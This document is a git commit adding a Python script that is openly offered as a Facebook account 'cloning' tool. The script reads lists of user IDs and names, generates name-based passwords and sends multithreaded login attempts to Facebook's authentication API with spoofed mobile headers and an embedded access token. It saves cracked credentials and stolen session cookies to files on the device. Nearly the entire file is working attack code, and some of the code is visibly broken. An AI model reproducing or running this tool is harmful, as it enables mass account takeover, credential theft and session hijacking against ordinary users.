7d742825e5ef91e72b2a14d236327107185626c0
WAQAR-XD <140652534+WAQAR-XD@users.noreply.github.com>
2023-07-28 14:33:24 +0500

    Add files via upload

---
+++ aqib2.py
@@ -0,0 +1,268 @@
+#coding = utf-8
+#This Open-Source Script is Written by JUTT Ali Khan
+#Please Donot Forget to give Credit 
+#Whatsapp : +923152056613
+import os
+import sys
+import re
+import random,zlib
+import time
+from time import sleep as sp
+import string,json
+import subprocess
+import base64,uuid
+from requests.exceptions import ConnectionError as CError
+from concurrent.futures import ThreadPoolExecutor as tpd
+
+
+try:
+	import requests
+except ImportError:
+	os.system('pip install requests')
+
+
+ses = requests.Session()
+
+id = []
+ok = []
+cp =[]
+loop = 0
+pwx = []
+method = []
+
+
+##______COLORS____ARE________######
+pwx=[]
+W = '\033[97;1m'
+R = '\033[91;1m'
+G = '\033[92;1m'
+Y = '\033[93;1m'
+B = '\033[94;1m'
+P = '\033[95;1m'
+S = '\033[96;1m'
+N = '\x1b[0m'
+#________________________________________#
+def clear():
+	os.system("clear")
+
+def line():
+	print(52*'-')
+def p(x):
+	print(x)
+
+def logo():
+	logo = (f'''\033[1;33m                                    
+
+
+  
+          _______  _______  _______  _______ 
+|\     /|(  ___  )(  ___  )(  ___  )(  ____ )
+| )   ( || (   ) || (   ) || (   ) || (    )|
+| | _ | || (___) || |   | || (___) || (____)|
+| |( )| ||  ___  || |   | ||  ___  ||     __)
+| || || || (   ) || | /\| || (   ) || (\ (   
+| () () || )   ( || (_\ \ || )   ( || ) \ \__
+(_______)|/     \|(____\/_)|/     \||/   \__/
+                                             
+                                             
+                                            
+'\033[96;1m'---------------------------------------------------
+ ( • ) Owner     : Waqar Jutt
+ ( • ) Wattsap   : +923481727313
+ ( • ) Version   : 0.1 
+'\033[32;1m'---------------------------------------------------''')
+	p(logo)
+
+
+ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "
+
+
+
+ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'
+
+# USER AGENT FUNCTION UA 1 METHOD 1
+def iAmAndroidUa():
+	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
+	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
+	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
+	ua = random.choice(["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'+Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; moto g 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; moto g stylus 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36v'+Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; moto g power (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 11; moto g power (2021)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36'+Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36'+Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36'+Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36'+Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'+Mozilla/5.0 (Linux; Android 12; Infinix X6817 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.132 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; Infinix X6817 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 6.0; Infinix G636 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; Infinix X672) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; Infinix X672) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'+Mozilla/5.0 (Linux; Android 12; Infinix X6817 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36;]",])+END
+	return ua
+
+	
+class Main:
+	def __init__(self):
+		os.system('clear')
+	def saved_results(self,ok,cp):
+		if len(ok) != 0 or len(cp) != 0:
+			p('\n')
+			line()
+			p(' [•] Cloning Process Has Been Completed ')
+			p(' [•] Total OK Accounts : %s '%(len(ok)))
+			p(' [•] Total CP Accounts : %s '%(len(cp)))
+			line()
+			input(' [•] Press Enter To Go Back To Main Menu ')
+			self.menu()
+	def menu(self):
+		logo()
+		p(' [•] JUTT BROTHERS💚 ')
+		line()
+		p(' [1] File Cracking ')
+		p(" [2] Join Facebook Group ")
+		p(' [3] Join Whatsapp Group ')
+		line()
+		m_1 = input(' [•] Choose : ')
+		if m_1 == '1':
+			self.methods_menu()
+		elif m_1 == '2':
+			os.system('xdg-open https://facebook.com/groups/285105604175906/')
+			sp(1)
+			self.menu()
+		elif m_2 =='3':
+			os.system('xdg-open https://chat.whatsapp.com/BPwwLojY6PS6Upix7Lpnlx')
+		else:
+			p(' [•] Wrong Select Hai Bhosdikay ')
+			sp(1)
+			self.menu()
+	def methods_menu(self):
+		line()
+		p(' [1] Method 1')
+		line()
+		m_2 = input(' [•] Select Method : ')
+		if m_2 == '1':
+			method.append('i')
+			self.cracking()
+		elif m_2 == '2':
+			method.append('ii')
+			self.cracking()
+		elif m_2 == '3':
+			method.append('iii')
+			self.cracking()
+		else:
+			p(' [•] Wrong Select ')
+			sp(1)
+			self.methods_menu()
+
+	def cracking(self):
+		clear()
+		logo()
+		try:
+			file = input(' [•] Put File Path : ')
+			id = open(file).read().splitlines()
+			self.password_menu(id)
+		except FileNotFoundError:
+			p(' [X] File Path Wrong....')
+			sp(2)
+			self.cracking()
+
+	def password_menu(self,id):
+		clear()
+		logo()
+		p(' [•] Enter Password Limit Between 1 to 20 (Max) ')
+		try:
+			plimit = int(input(' [•] Put Limit : '))
+			if plimit == '':
+				plimit = 4
+			elif plimit > 20:
+				limit = 10
+		except:
+			plimit = 4
+		clear();logo()
+		print(' [•] Example : first123,last1122,firstlast,last Etc ')
+		for n in range(plimit):
+			pwx.append(input(' [•] Put Password %s : '%(n+1)))
+		clear();logo()
+		p(' [•] Process Has Been Started ')
+		p(' [•] Total Clone Accounts :  %s '%(len(id)))
+		p(' [•] Use Flight Mode After 5 minutes ')
+		line()
+		with tpd(max_workers=30) as saqi:
+			for user in id:
+				uid,nm = user.split('|')
+				if 'i' in method:
+					saqi.submit(self.method1,uid,nm,pwx)
+				elif 'ii' in method:
+					saqi.submit(self.method2,uid,nm,pwx)
+				elif 'iii' in method:
+					saqi.submit(self.method3,uid,nm,pwx)
+		self.saved_results(ok,cp)
+
+	def method1(self,uid,nm,pwx):
+		try:
+			global ok , cp , loop
+			sys.stdout.write('\r [JUTT] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			fn = nm.split(' ')[0]
+			try:
+				ln = nm.split(' ')[1]
+			except:
+				ln = fn
+			for ps in pwx:
+				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
+				data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": uid,
+"password": pw,
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "GB",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+				headers = {'User-Agent': iAmAndroidUa(),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+				if "session_key" in q:
+					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+					cookie = f"sb={sb};{coki}"
+					p('\r\033[1;92m[JUTT-OK] %s | %s \033[1;97m '%(uid,pw))
+					ok.append(uid)
+					open('/sdcard/JUTT_M1_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/JUTT_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+					break
+				elif 'www.facebook.com' in q['error']['message']:
+					p('\r\033[1;91m[JUTT-CP] %s | %s \033[1;97m '%(uid,pw))
+					cp.append(uid)
+					open('/sdcard/JUTT_M1_CP.txt','a').write(uid+'|'+pw+'\n')
+					break
+				else:
+					continue
+			loop+=1
+		except requests.exceptions.ConnectionError:
+				self.method1(uid,nm,pwx)
+
+	def method2(self,uid,nm,pwx):
+		#YE METHOD 2 HE
+		print(" [ METHOD 2] YHN AP 2ND METHOD LGALO ...")
+		exit()
+
+	def method3(self,uid,nm,pwx):
+		#YE METHOD 3 HE
+		print(" [ METHOD 3 ] YHN AP 3RD METHOD LGALO ...")
+		exit()
+
+		exit()
+if __name__=="__main__":
+	Main().menu()
